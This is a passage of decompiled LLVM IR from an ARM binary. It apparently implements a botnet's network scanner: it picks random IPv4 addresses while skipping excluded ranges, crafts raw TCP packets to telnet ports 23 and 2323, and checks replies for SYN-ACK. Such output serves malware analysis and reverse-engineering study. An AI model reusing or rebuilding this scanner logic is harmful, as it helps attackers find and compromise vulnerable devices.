  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e090 = icmp eq i1 %v7_e07c, false
  store i1 %v2_e090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e090, label %dec_label_pc_e0a0, label %dec_label_pc_e098

dec_label_pc_e098:                                ; preds = %bb355
  %v2_e098 = icmp ugt i32 %v1_e040, 30
  store i1 %v2_e098, i1* %cpsr_c.global-to-local, align 1
  %v7_e098 = icmp eq i32 %v1_e040, 31
  store i1 %v7_e098, i1* %cpsr_z.global-to-local, align 1
  %v2_e09c = xor i1 %v2_e098, true
  %v3_e09c = or i1 %v7_e098, %v2_e09c
  br i1 %v3_e09c, label %dec_label_pc_e028, label %dec_label_pc_e0a0

dec_label_pc_e0a0:                                ; preds = %.thread8, %dec_label_pc_e098, %bb355
  %v7_e0a0 = icmp eq i32 %v1_e02c, 100
  %.430 = zext i1 %v7_e0a0 to i32
  store i32 %.430, i32* %r3.global-to-local, align 4
  %v2_e0ac = icmp ugt i32 %v1_e040, 62
  store i1 %v2_e0ac, i1* %cpsr_c.global-to-local, align 1
  %v7_e0ac = icmp eq i32 %v1_e040, 63
  store i1 %v7_e0ac, i1* %cpsr_z.global-to-local, align 1
  %v2_e0b0 = xor i1 %v2_e0ac, true
  %v3_e0b0 = or i1 %v7_e0ac, %v2_e0b0
  br i1 %v3_e0b0, label %.thread13, label %bb358

.thread13:                                        ; preds = %dec_label_pc_e0a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e0c4

bb358:                                            ; preds = %dec_label_pc_e0a0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e0b4 = icmp eq i1 %v7_e0a0, false
  store i1 %v2_e0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e0b4, label %dec_label_pc_e0c4, label %dec_label_pc_e0bc

dec_label_pc_e0bc:                                ; preds = %bb358
  %v2_e0bc = icmp ugt i32 %v1_e040, 125
  store i1 %v2_e0bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e0bc = icmp eq i32 %v1_e040, 126
  store i1 %v7_e0bc, i1* %cpsr_z.global-to-local, align 1
  %v2_e0c0 = xor i1 %v2_e0bc, true
  %v3_e0c0 = or i1 %v7_e0bc, %v2_e0c0
  br i1 %v3_e0c0, label %dec_label_pc_e028, label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %.thread13, %dec_label_pc_e0bc, %bb358
  %v2_e0c4 = icmp ugt i32 %v1_e02c, 168
  store i1 %v2_e0c4, i1* %cpsr_c.global-to-local, align 1
  %v7_e0c4 = icmp eq i32 %v1_e02c, 169
  store i1 %v7_e0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e0c4, label %bb359, label %dec_label_pc_e0d0

bb359:                                            ; preds = %dec_label_pc_e0c4
  %v3_e0c8 = icmp eq i32 %v1_e040, 255
  store i1 %v3_e0c8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e0c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e0c8, label %dec_label_pc_e028, label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4, %bb359
  %v7_e0d0 = icmp eq i32 %v1_e02c, 198
  %.431 = zext i1 %v7_e0d0 to i32
  store i32 %.431, i32* %r3.global-to-local, align 4
  %v2_e0dc = icmp ugt i32 %v1_e040, 16
  store i1 %v2_e0dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e0dc = icmp eq i32 %v1_e040, 17
  store i1 %v7_e0dc, i1* %cpsr_z.global-to-local, align 1
  %v2_e0e0 = xor i1 %v2_e0dc, true
  %v3_e0e0 = or i1 %v7_e0dc, %v2_e0e0
  br i1 %v3_e0e0, label %.thread19, label %bb362

.thread19:                                        ; preds = %dec_label_pc_e0d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e0f4

bb362:                                            ; preds = %dec_label_pc_e0d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e0e4 = icmp eq i1 %v7_e0d0, false
  store i1 %v2_e0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e0e4, label %dec_label_pc_e0f4, label %dec_label_pc_e0ec

dec_label_pc_e0ec:                                ; preds = %bb362
  %v2_e0ec = icmp ugt i32 %v1_e040, 18
  store i1 %v2_e0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e0ec = icmp eq i32 %v1_e040, 19
  store i1 %v7_e0ec, i1* %cpsr_z.global-to-local, align 1
  %v2_e0f0 = xor i1 %v2_e0ec, true
  %v3_e0f0 = or i1 %v7_e0ec, %v2_e0f0
  br i1 %v3_e0f0, label %dec_label_pc_e028, label %dec_label_pc_e0f4

dec_label_pc_e0f4:                                ; preds = %.thread19, %dec_label_pc_e0ec, %bb362
  %v2_e0f4 = icmp ugt i32 %v1_e02c, 222
  store i1 %v2_e0f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e0f4 = icmp eq i32 %v1_e02c, 223
  store i1 %v7_e0f4, i1* %cpsr_z.global-to-local, align 1
  %v2_e0f8 = xor i1 %v7_e0f4, true
  %v3_e0f8 = and i1 %v2_e0f4, %v2_e0f8
  br i1 %v3_e0f8, label %dec_label_pc_e028, label %dec_label_pc_e0fc

dec_label_pc_e0fc:                                ; preds = %dec_label_pc_e0f4
  %v1_e0fc = add nsw i32 %v1_e02c, -6
  store i32 %v1_e0fc, i32* %r3.global-to-local, align 4
  %v2_e100 = icmp ugt i32 %v1_e02c, 10
  store i1 %v2_e100, i1* %cpsr_c.global-to-local, align 1
  %v7_e100 = icmp eq i32 %v1_e02c, 11
  store i1 %v7_e100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e100, label %dec_label_pc_e028, label %bb363

bb363:                                            ; preds = %dec_label_pc_e0fc
  %v3_e104 = icmp ne i32 %v1_e0fc, 0
  store i1 %v3_e104, i1* %cpsr_c.global-to-local, align 1
  %v8_e104 = icmp eq i32 %v1_e0fc, 1
  store i1 %v8_e104, i1* %cpsr_z.global-to-local, align 1
  %v2_e108 = xor i1 %v3_e104, true
  %v3_e108 = or i1 %v8_e104, %v2_e108
  br i1 %v3_e108, label %dec_label_pc_e028, label %dec_label_pc_e10c

dec_label_pc_e10c:                                ; preds = %bb363
  %v2_e10c = icmp ugt i32 %v1_e02c, 21
  store i1 %v2_e10c, i1* %cpsr_c.global-to-local, align 1
  %v7_e10c = icmp eq i32 %v1_e02c, 22
  store i1 %v7_e10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e10c, label %dec_label_pc_e028, label %bb364

bb364:                                            ; preds = %dec_label_pc_e10c
  %v3_e110 = icmp ugt i32 %v1_e02c, 20
  store i1 %v3_e110, i1* %cpsr_c.global-to-local, align 1
  %v8_e110 = icmp eq i32 %v1_e02c, 21
  store i1 %v8_e110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e110, label %dec_label_pc_e028, label %dec_label_pc_e118

dec_label_pc_e118:                                ; preds = %bb364
  %v2_e118 = icmp ugt i32 %v1_e02c, 27
  store i1 %v2_e118, i1* %cpsr_c.global-to-local, align 1
  %v7_e118 = icmp eq i32 %v1_e02c, 28
  store i1 %v7_e118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e118, label %dec_label_pc_e028, label %bb365

bb365:                                            ; preds = %dec_label_pc_e118
  %v3_e11c = icmp ugt i32 %v1_e02c, 25
  store i1 %v3_e11c, i1* %cpsr_c.global-to-local, align 1
  %v8_e11c = icmp eq i32 %v1_e02c, 26
  store i1 %v8_e11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e11c, label %dec_label_pc_e028, label %dec_label_pc_e124

dec_label_pc_e124:                                ; preds = %bb365
  %v2_e124 = icmp ugt i32 %v1_e02c, 29
  store i1 %v2_e124, i1* %cpsr_c.global-to-local, align 1
  %v7_e124 = icmp eq i32 %v1_e02c, 30
  store i1 %v7_e124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e124, label %dec_label_pc_e028, label %bb366

bb366:                                            ; preds = %dec_label_pc_e124
  %v3_e128 = icmp ugt i32 %v1_e02c, 28
  store i1 %v3_e128, i1* %cpsr_c.global-to-local, align 1
  %v8_e128 = icmp eq i32 %v1_e02c, 29
  store i1 %v8_e128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e128, label %dec_label_pc_e028, label %dec_label_pc_e130

dec_label_pc_e130:                                ; preds = %bb366
  %v2_e130 = icmp ugt i32 %v1_e02c, 54
  store i1 %v2_e130, i1* %cpsr_c.global-to-local, align 1
  %v7_e130 = icmp eq i32 %v1_e02c, 55
  store i1 %v7_e130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e130, label %dec_label_pc_e028, label %bb367

bb367:                                            ; preds = %dec_label_pc_e130
  %v3_e134 = icmp ugt i32 %v1_e02c, 32
  store i1 %v3_e134, i1* %cpsr_c.global-to-local, align 1
  %v8_e134 = icmp eq i32 %v1_e02c, 33
  store i1 %v8_e134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e134, label %dec_label_pc_e028, label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %bb367
  %v2_e13c = icmp ugt i32 %v1_e02c, 214
  store i1 %v2_e13c, i1* %cpsr_c.global-to-local, align 1
  %v7_e13c = icmp eq i32 %v1_e02c, 215
  store i1 %v7_e13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e13c, label %.thread30, label %bb368

bb368:                                            ; preds = %dec_label_pc_e13c
  %v3_e140 = icmp ugt i32 %v1_e02c, 213
  store i1 %v3_e140, i1* %cpsr_c.global-to-local, align 1
  %v8_e140 = icmp eq i32 %v1_e02c, 214
  store i1 %v8_e140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e140, label %bb369, label %dec_label_pc_e150

.thread30:                                        ; preds = %dec_label_pc_e13c
  br label %dec_label_pc_e028

bb369:                                            ; preds = %bb368
  br label %dec_label_pc_e028

dec_label_pc_e150:                                ; preds = %bb368
  %v5_e15c = call i32 @llvm.bswap.i32(i32 %v0_e028)
  store i32 %v5_e15c, i32* %r3.global-to-local, align 4
  %tmp370 = and i32 %v0_e028, 65280
  %tmp371 = call i32 @llvm.bswap.i32(i32 %tmp370)
  %v3_e164 = udiv i32 %v5_e15c, 16777216
  %tmp372 = and i32 %v0_e028, 16711680
  %tmp373 = call i32 @llvm.bswap.i32(i32 %tmp372)
  %v4_e16c = udiv i32 %tmp371, 256
  %v4_e170 = mul nuw nsw i32 %tmp373, 256
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* @r0, align 4
  %tmp374 = and i32 %v0_e028, 65536
  %v3_e178 = icmp ne i32 %tmp374, 0
  store i1 %v3_e178, i1* %cpsr_c.global-to-local, align 1
  %v4_e178 = mul i32 %v5_e15c, 16777216
  %v5_e16c = or i32 %v4_e178, %v3_e164
  %v5_e170 = or i32 %v5_e16c, %v4_e16c
  %v5_e178 = or i32 %v5_e170, %v4_e170
  store i32 %v5_e178, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_20f3e.484 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_e178, i32* @global_var_20f44.485, align 4
  %v3_e188 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32 20)
  store i32 %v3_e188, i32* %r0.global-to-local, align 4
  %v3_e18c = load i16, i16* %stack_var_-52, align 2
  %v4_e18c = sext i16 %v3_e18c to i32
  store i32 %v4_e18c, i32* %r1.global-to-local, align 4
  %tmp531 = sdiv i16 %v3_e18c, 10
  %v5_e19c = zext i16 %tmp531 to i32
  %v3_e1a0 = mul nuw nsw i32 %v5_e19c, 8
  store i32 %v3_e1a0, i32* %r2.global-to-local, align 4
  %v2_e1a8 = mul nuw nsw i32 %v5_e19c, 10
  store i32 %v2_e1a8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* %ip.global-to-local, align 4
  %v3_e1b0 = icmp uge i32 %v4_e18c, %v2_e1a8
  store i1 %v3_e1b0, i1* %cpsr_c.global-to-local, align 1
  %v9_e1b0 = icmp eq i32 %v4_e18c, %v2_e1a8
  store i1 %v9_e1b0, i1* %cpsr_z.global-to-local, align 1
  %v1_e1b4 = trunc i32 %v3_e188 to i16
  store i16 %v1_e1b4, i16* bitcast (i32* @global_var_20f3e.484 to i16*), align 4
  br i1 %v9_e1b0, label %bb375, label %.thread37.thread

.thread37.thread:                                 ; preds = %dec_label_pc_e150
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20f48.137 to i32), i32 2) to i16*), align 2
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* %r0.global-to-local, align 4
  br label %.thread39

bb375:                                            ; preds = %dec_label_pc_e150
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* %r0.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20f48.137 to i32), i32 2) to i16*), align 2
  br label %.thread39

.thread39:                                        ; preds = %.thread37.thread, %bb375
  %v4_e1d8 = load i32, i32* @global_var_20f44.485, align 4
  store i32 %v4_e1d8, i32* @global_var_20f4c.487, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_20f58.488 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_20f48.137 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_e1f8 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32 ptrtoint (i32* @global_var_20f48.137 to i32), i32 5120, i32 20)
  %v6_e1f8 = trunc i32 %v5_e1f8 to i16
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* %r1.global-to-local, align 4
  %v2_e204 = load i32, i32* @global_var_23a44.132, align 4
  store i16 %v6_e1f8, i16* bitcast (i32* @global_var_20f58.488 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_e230 = load i16, i16* @global_var_20f4a.142, align 2
  %v4_e230 = zext i16 %v3_e230 to i32
  store i32 %v4_e230, i32* @lr, align 4
  store i32 %v2_dff8, i32* %ip.global-to-local, align 4
  store i32 %v2_e204, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_e24c = call i32 @__libc_sendto(i32 %v2_e204, i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32 40, i32 16384, i32 %v2_dff8, i32 16)
  store i32 %v7_e24c, i32* %r0.global-to-local, align 4
  %v3_e250 = load i16, i16* %stack_var_-52, align 2
  %v4_e250 = sext i16 %v3_e250 to i32
  %v1_e254 = add nsw i32 %v4_e250, 1
  store i32 %v1_e254, i32* %r3.global-to-local, align 4
  %v3_e258 = icmp ugt i32 %v1_e254, 383
  store i1 %v3_e258, i1* %cpsr_c.global-to-local, align 1
  %v8_e258 = icmp eq i32 %v1_e254, 384
  store i1 %v8_e258, i1* %cpsr_z.global-to-local, align 1
  %v5_e25c = trunc i32 %v1_e254 to i16
  store i16 %v5_e25c, i16* %stack_var_-52, align 2
  %v5_e260 = icmp slt i32 %v1_e254, 384
  br i1 %v5_e260, label %dec_label_pc_dffc, label %dec_label_pc_e264

dec_label_pc_e264:                                ; preds = %.thread39
  %v0_e264 = load i32, i32* @r4, align 4
  store i32 %v0_e264, i32* @fp, align 4
  br label %dec_label_pc_e268

dec_label_pc_e268:                                ; preds = %dec_label_pc_dfe0, %dec_label_pc_e264
  %v0_e268 = call i32 @__GI___errno_location()
  store i32 %v0_e268, i32* @sb, align 4
  store i32 %stack_var_-1880.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_e278 = add i32 %stack_var_-1880.0, 20
  store i32 %v1_e278, i32* @r4, align 4
  %v1_e2cc = add i32 %stack_var_-1880.0, 16
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  %v1_e2e0 = add i32 %stack_var_-1880.0, 9
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i8*
  %v4_e30c = sext i16 %stack_var_-1876.0 to i32
  %v1_e374 = add i32 %stack_var_-1880.0, 12
  %v2_e374 = inttoptr i32 %v1_e374 to i32*
  br label %dec_label_pc_e27c

dec_label_pc_e27c:                                ; preds = %dec_label_pc_e33c, %dec_label_pc_e334, %dec_label_pc_e32c, %dec_label_pc_e308, %dec_label_pc_e2f8, %dec_label_pc_e2dc, %dec_label_pc_e2c4, %dec_label_pc_e324, %dec_label_pc_e318, %dec_label_pc_e2bc, %dec_label_pc_e3f4, %dec_label_pc_e268
  %v1_e280 = phi i32 [ %v0_e268, %dec_label_pc_e268 ], [ %v1_e280.pre.pre, %dec_label_pc_e3f4 ], [ %v0_e2b0, %dec_label_pc_e2bc ], [ %v0_e2b0, %dec_label_pc_e318 ], [ %v0_e2b0, %dec_label_pc_e324 ], [ %v0_e2b0, %dec_label_pc_e2c4 ], [ %v0_e2b0, %dec_label_pc_e2dc ], [ %v0_e2b0, %dec_label_pc_e2f8 ], [ %v0_e2b0, %dec_label_pc_e308 ], [ %v0_e2b0, %dec_label_pc_e32c ], [ %v0_e2b0, %dec_label_pc_e334 ], [ %v0_e2b0, %dec_label_pc_e33c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_e280 = inttoptr i32 %v1_e280 to i32*
  store i32 0, i32* %v2_e280, align 4
  %v2_e28c = load i32, i32* @global_var_23a44.132, align 4
  store i32 %v2_e28c, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e29c = load i32, i32* %ip.global-to-local, align 4
  %v6_e2a4 = call i32 @__libc_recvfrom(i32 %v2_e28c, i32 %stack_var_-1880.0, i32 1514, i32 16384, i32 %v0_e29c, i32 %v0_e29c)
  store i32 %v6_e2a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e2a8 = icmp eq i32 %v6_e2a4, 0
  store i1 %v2_e2a8, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v6_e2a4, 1
  br i1 %tmp376, label %dec_label_pc_e418, label %dec_label_pc_e2b0

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e27c
  %v0_e2b0 = load i32, i32* @sb, align 4
  %v1_e2b0 = inttoptr i32 %v0_e2b0 to i32*
  %v2_e2b0 = load i32, i32* %v1_e2b0, align 4
  store i32 %v2_e2b0, i32* %r3.global-to-local, align 4
  %v2_e2b4 = icmp ugt i32 %v2_e2b0, 10
  store i1 %v2_e2b4, i1* %cpsr_c.global-to-local, align 1
  %v7_e2b4 = icmp eq i32 %v2_e2b0, 11
  store i1 %v7_e2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2b4, label %dec_label_pc_e418, label %dec_label_pc_e2bc

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e2b0
  %v2_e2bc = icmp ugt i32 %v6_e2a4, 38
  store i1 %v2_e2bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e2bc = icmp eq i32 %v6_e2a4, 39
  store i1 %v7_e2bc, i1* %cpsr_z.global-to-local, align 1
  %v2_e2c0 = xor i1 %v2_e2bc, true
  %v3_e2c0 = or i1 %v7_e2bc, %v2_e2c0
  br i1 %v3_e2c0, label %dec_label_pc_e27c, label %dec_label_pc_e2c4

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e2bc
  store i32 %stack_var_-1880.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* %ip.global-to-local, align 4
  %v3_e2cc = load i32, i32* %v2_e2cc, align 4
  store i32 %v3_e2cc, i32* %r2.global-to-local, align 4
  %v2_e2d0 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_e2d0, i32* %r3.global-to-local, align 4
  %v3_e2d4 = icmp uge i32 %v3_e2cc, %v2_e2d0
  store i1 %v3_e2d4, i1* %cpsr_c.global-to-local, align 1
  %v9_e2d4 = icmp eq i32 %v3_e2cc, %v2_e2d0
  store i1 %v9_e2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2d4, label %dec_label_pc_e2dc, label %dec_label_pc_e27c

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e2c4
  store i32 %stack_var_-1880.0, i32* @lr, align 4
  %v3_e2e0 = load i8, i8* %v2_e2e0, align 1
  %v4_e2e0 = zext i8 %v3_e2e0 to i32
  store i32 %v4_e2e0, i32* %r3.global-to-local, align 4
  %v2_e2e4 = icmp ugt i8 %v3_e2e0, 5
  store i1 %v2_e2e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e2e4 = icmp eq i8 %v3_e2e0, 6
  store i1 %v7_e2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2e4, label %dec_label_pc_e2ec, label %dec_label_pc_e27c

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e2dc
  %v0_e2ec = load i32, i32* @r4, align 4
  %v1_e2ec = inttoptr i32 %v0_e2ec to i16*
  %v2_e2ec = load i16, i16* %v1_e2ec, align 2
  %v3_e2ec = zext i16 %v2_e2ec to i32
  store i32 %v3_e2ec, i32* %ip.global-to-local, align 4
  %v2_e2f0 = icmp ugt i16 %v2_e2ec, 5887
  store i1 %v2_e2f0, i1* %cpsr_c.global-to-local, align 1
  %v7_e2f0 = icmp eq i16 %v2_e2ec, 5888
  store i1 %v7_e2f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2f0, label %dec_label_pc_e308, label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2ec
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_e300 = icmp ugt i16 %v2_e2ec, 4872
  store i1 %v3_e300, i1* %cpsr_c.global-to-local, align 1
  %v9_e300 = icmp eq i16 %v2_e2ec, 4873
  store i1 %v9_e300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e300, label %dec_label_pc_e308, label %dec_label_pc_e27c

dec_label_pc_e308:                                ; preds = %dec_label_pc_e2f8, %dec_label_pc_e2ec
  %v1_e308 = add i32 %v0_e2ec, 2
  %v2_e308 = inttoptr i32 %v1_e308 to i16*
  %v3_e308 = load i16, i16* %v2_e308, align 2
  %v4_e308 = zext i16 %v3_e308 to i32
  store i32 %v4_e308, i32* %r3.global-to-local, align 4
  store i32 %v4_e30c, i32* %r0.global-to-local, align 4
  %v3_e310 = icmp uge i32 %v4_e308, %v4_e30c
  store i1 %v3_e310, i1* %cpsr_c.global-to-local, align 1
  %v9_e310 = icmp eq i32 %v4_e308, %v4_e30c
  store i1 %v9_e310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e310, label %dec_label_pc_e318, label %dec_label_pc_e27c

dec_label_pc_e318:                                ; preds = %dec_label_pc_e308
  %v1_e318 = add i32 %v0_e2ec, 13
  %v2_e318 = inttoptr i32 %v1_e318 to i8*
  %v3_e318 = load i8, i8* %v2_e318, align 1
  %v4_e318 = zext i8 %v3_e318 to i32
  store i32 %v4_e318, i32* %r3.global-to-local, align 4
  %v1_e31c = and i32 %v4_e318, 2
  %v2_e31c = icmp eq i32 %v1_e31c, 0
  store i1 %v2_e31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e31c, label %dec_label_pc_e27c, label %dec_label_pc_e324

dec_label_pc_e324:                                ; preds = %dec_label_pc_e318
  %v1_e324 = and i32 %v4_e318, 16
  %v2_e324 = icmp eq i32 %v1_e324, 0
  store i1 %v2_e324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e324, label %dec_label_pc_e27c, label %dec_label_pc_e32c

dec_label_pc_e32c:                                ; preds = %dec_label_pc_e324
  %v1_e32c = and i32 %v4_e318, 4
  %v2_e32c = icmp eq i32 %v1_e32c, 0
  store i1 %v2_e32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e32c, label %dec_label_pc_e334, label %dec_label_pc_e27c

dec_label_pc_e334:                                ; preds = %dec_label_pc_e32c
  %tmp532 = urem i8 %v3_e318, 2
  %v2_e334 = icmp eq i8 %tmp532, 0
  store i1 %v2_e334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e334, label %dec_label_pc_e33c, label %dec_label_pc_e27c

dec_label_pc_e33c:                                ; preds = %dec_label_pc_e334
  %v1_e33c = add i32 %v0_e2ec, 8
  %v2_e33c = inttoptr i32 %v1_e33c to i32*
  %v3_e33c = load i32, i32* %v2_e33c, align 4
  %v5_e354 = call i32 @llvm.bswap.i32(i32 %v3_e33c)
  %v1_e358 = add i32 %v5_e354, -1
  store i32 %v1_e358, i32* %r2.global-to-local, align 4
  %v1_e35c = and i32 %v1_e358, 16711680
  store i32 %v1_e35c, i32* %r0.global-to-local, align 4
  %v3_e360 = udiv i32 %v1_e358, 16777216
  %v4_e368 = udiv i32 %v1_e35c, 256
  %v5_e368 = or i32 %v4_e368, %v3_e360
  %v1_e364 = mul i32 %v1_e358, 256
  %v4_e36c = and i32 %v1_e364, 16711680
  %v5_e36c = or i32 %v5_e368, %v4_e36c
  store i32 %v5_e36c, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v3_e374 = load i32, i32* %v2_e374, align 4
  store i32 %v3_e374, i32* @lr, align 4
  %v5_e378 = call i32 @llvm.bswap.i32(i32 %v1_e358)
  store i32 %v5_e378, i32* %r3.global-to-local, align 4
  %v3_e37c = icmp uge i32 %v5_e378, %v3_e374
  store i1 %v3_e37c, i1* %cpsr_c.global-to-local, align 1
  %v9_e37c = icmp eq i32 %v5_e378, %v3_e374
  store i1 %v9_e37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e37c, label %dec_label_pc_e384, label %dec_label_pc_e27c

dec_label_pc_e384:                                ; preds = %dec_label_pc_e33c
  %v0_e384 = load i32, i32* @r5, align 4
  %v2_e384 = icmp ugt i32 %v0_e384, 254
  store i1 %v2_e384, i1* %cpsr_c.global-to-local, align 1
  %v7_e384 = icmp eq i32 %v0_e384, 255
  store i1 %v7_e384, i1* %cpsr_z.global-to-local, align 1
  %v8_e388 = icmp sgt i32 %v0_e384, 255
  br i1 %v8_e388, label %dec_label_pc_e418, label %dec_label_pc_e38c

dec_label_pc_e38c:                                ; preds = %dec_label_pc_e384
  %v2_e394 = load i32, i32* @global_var_23a40.130, align 4
  store i32 %v2_e394, i32* %r1.global-to-local, align 4
  %v3_e398 = mul i32 %v0_e384, 256
  store i32 %v3_e398, i32* %r2.global-to-local, align 4
  %v2_e39c = mul i32 %v0_e384, 288
  store i32 %v2_e39c, i32* %r3.global-to-local, align 4
  %v2_e3a0 = add i32 %v2_e394, %v2_e39c
  store i32 %v2_e3a0, i32* @r0, align 4
  %v1_e3a4 = add i32 %v2_e3a0, 12
  %v2_e3a4 = inttoptr i32 %v1_e3a4 to i32*
  %v3_e3a4 = load i32, i32* %v2_e3a4, align 4
  store i32 %v3_e3a4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e3a8 = icmp eq i32 %v3_e3a4, 0
  store i1 %v2_e3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e3a8, label %dec_label_pc_e3ec, label %dec_label_pc_e3c8.preheader

dec_label_pc_e3c8.preheader:                      ; preds = %dec_label_pc_e38c
  %v2_e3ac = add i32 %v0_e384, 1
  %v2_e3b4 = and i32 %v2_e3ac, 134217728
  %v3_e3b4 = icmp ne i32 %v2_e3b4, 0
  store i1 %v3_e3b4, i1* %cpsr_c.global-to-local, align 1
  %v3_e3b8 = mul i32 %v2_e3ac, 288
  %v3_e3bc = add i32 %v2_e394, %v3_e3b8
  store i32 %v3_e3bc, i32* %r3.global-to-local, align 4
  store i32 %v0_e384, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e3c8

dec_label_pc_e3c8:                                ; preds = %dec_label_pc_e3c8.preheader, %dec_label_pc_e3d4
  %v0_e3d4 = phi i32 [ %v3_e3bc, %dec_label_pc_e3c8.preheader ], [ %v1_e3e0, %dec_label_pc_e3d4 ]
  %v0_e3c8 = phi i32 [ %v0_e384, %dec_label_pc_e3c8.preheader ], [ %v1_e3c8, %dec_label_pc_e3d4 ]
  %v1_e3c8 = add i32 %v0_e3c8, 1
  store i32 %v1_e3c8, i32* %r2.global-to-local, align 4
  %v7_e3cc = icmp eq i32 %v1_e3c8, 256
  br i1 %v7_e3cc, label %dec_label_pc_e418.loopexit, label %dec_label_pc_e3d4

dec_label_pc_e3d4:                                ; preds = %dec_label_pc_e3c8
  store i32 %v0_e3d4, i32* @r0, align 4
  %v1_e3d8 = add i32 %v0_e3d4, 12
  %v2_e3d8 = inttoptr i32 %v1_e3d8 to i32*
  %v3_e3d8 = load i32, i32* %v2_e3d8, align 4
  %v2_e3dc = icmp eq i32 %v3_e3d8, 0
  %v1_e3e0 = add i32 %v0_e3d4, 288
  store i32 %v1_e3e0, i32* %r3.global-to-local, align 4
  br i1 %v2_e3dc, label %dec_label_pc_e3e8, label %dec_label_pc_e3c8

dec_label_pc_e3e8:                                ; preds = %dec_label_pc_e3d4
